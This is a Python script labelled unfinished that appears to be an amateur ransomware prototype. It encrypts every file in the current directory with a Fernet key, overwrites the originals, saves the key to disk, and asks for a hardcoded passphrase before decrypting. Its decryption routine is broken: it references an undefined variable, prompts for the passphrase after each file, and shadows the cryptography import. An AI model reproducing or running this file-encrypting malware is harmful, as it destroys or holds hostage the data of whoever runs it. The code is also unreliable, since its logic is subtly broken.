#still not done#
from cryptography.fernet import Fernet as f
import os
import time
files = []
for file in os.listdir():
	if file == "main.py" or file ==  "key.key" or file == "ieth5esoh9thi0lu0mohn3Siechao5RabaeGhied.txt" or file == "runner.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = f.generate_key()

def encrypt(kie, ef):
	h = "hello"
	for file in ef:
		with open("key.key","wb") as thekey:
			thekey.write(kie)
		with open(file, "rb") as fail:
			contents = fail.read()
		contents_encrypted = f(kie).encrypt(contents)
		with open(file, "wb") as fail:
			fail.write(contents_encrypted)
		with open("ieth5esoh9thi0lu0mohn3Siechao5RabaeGhied.txt", "wb") as prove:
			prove.write(kie)
		fun3(kie, ef)
def decrypt(ki, fi):
	 for file in fi:

                with open(file, "rb") as fail:
                        contents = fail.read()
                contents_encrypted = f(ki).decrypt(contents)
                with open(file, "wb") as fail:
                        fail.write(contents_decrypted)
def fun3(k, f):
	user_phrase = input("please enter passphrase >>>")
	passphrase = "password"
	if user_phrase == passphrase:
		decrypt(k, f)

